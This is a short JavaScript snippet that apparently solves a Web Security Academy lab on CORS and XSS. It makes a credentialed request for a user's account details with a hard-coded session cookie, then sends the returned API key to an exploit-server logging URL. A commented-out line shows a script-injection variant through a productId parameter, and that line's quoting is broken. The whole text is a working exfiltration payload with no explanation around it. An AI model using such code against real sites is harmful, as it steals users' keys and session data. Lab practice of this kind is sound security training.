fetch(
  'https://0a5200a20381945080068a9000a30063.web-security-academy.net/accountDetails',
  {
    method: 'GET',
    credentials: 'include',
    headers: {
      Cookie: 'session=k37UDnJbUWbs2VaEtebmOILw6wvL9cDF'
    }
  })
  .then((response) => response.json())
  .then((data) => {
    console.log(data)
    fetch(`https://exploit-0a1d00af03f194f3803989cf0168008b.exploit-server.net/log?key=${data.apikey}`);
  });

//location = "http://stock.0aec001204c16d6282a7748600ec0015.web-security-academy.net/?productId=1<script>fetch('https://0aec001204c16d6282a7748600ec0015.web-security-academy.net/log?key=${data}`); });</script>storeId=1"